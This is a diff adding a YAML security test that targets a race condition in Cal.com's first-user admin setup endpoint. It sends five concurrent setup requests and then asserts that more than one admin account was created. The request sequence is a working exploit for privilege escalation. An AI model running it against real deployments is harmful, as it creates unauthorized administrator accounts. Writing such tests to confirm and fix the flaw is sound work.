@@ -1,0 +1,84 @@
+name: caldiy-setup-race-condition
+description: |
+  Tests for TOCTOU race condition in /api/auth/setup endpoint.
+  The handler checks prisma.user.count() === 0 then creates a user with
+  role: ADMIN. Two concurrent requests can both see count === 0 and both
+  create admin users, bypassing the "first user only" guard.
+  File: apps/web/app/api/auth/setup/route.ts (lines 29-57)
+config:
+  timeoutSeconds: 600
+items:
+  - $ref: ../shared/cal-postgres.yaml
+  - $ref: ../shared/cal-redis.yaml
+  - $ref: ../shared/cal-web.yaml
+tests:
+  - name: Race condition creates multiple admin users
+    steps:
+      - name: Five concurrent setup requests with different credentials
+        action:
+          type: parallel
+          actions:
+            - type: httpRequest
+              method: POST
+              url: calcom/api/auth/setup
+              headers:
+                Content-Type: application/json
+              body:
+                username: admin1
+                full_name: Admin User One
+                email_address: admin1@dokkimi-test.com
+                password: TestPassword123!!
+            - type: httpRequest
+              method: POST
+              url: calcom/api/auth/setup
+              headers:
+                Content-Type: application/json
+              body:
+                username: admin2
+                full_name: Admin User Two
+                email_address: admin2@dokkimi-test.com
+                password: TestPassword123!!
+            - type: httpRequest
+              method: POST
+              url: calcom/api/auth/setup
+              headers:
+                Content-Type: application/json
+              body:
+                username: admin3
+                full_name: Admin User Three
+                email_address: admin3@dokkimi-test.com
+                password: TestPassword123!!
+            - type: httpRequest
+              method: POST
+              url: calcom/api/auth/setup
+              headers:
+                Content-Type: application/json
+              body:
+                username: admin4
+                full_name: Admin User Four
+                email_address: admin4@dokkimi-test.com
+                password: TestPassword123!!
+            - type: httpRequest
+              method: POST
+              url: calcom/api/auth/setup
+              headers:
+                Content-Type: application/json
+              body:
+                username: admin5
+                full_name: Admin User Five
+                email_address: admin5@dokkimi-test.com
+                password: TestPassword123!!
+
+      - name: Count admin users created
+        action:
+          type: dbQuery
+          database: cal-postgres
+          query: >
+            SELECT count(*)::int AS admin_count
+            FROM "users"
+            WHERE role = 'ADMIN'
+        assertions:
+          - assertions:
+              - path: $.response.data[0].admin_count
+                operator: gt
+                value: 1
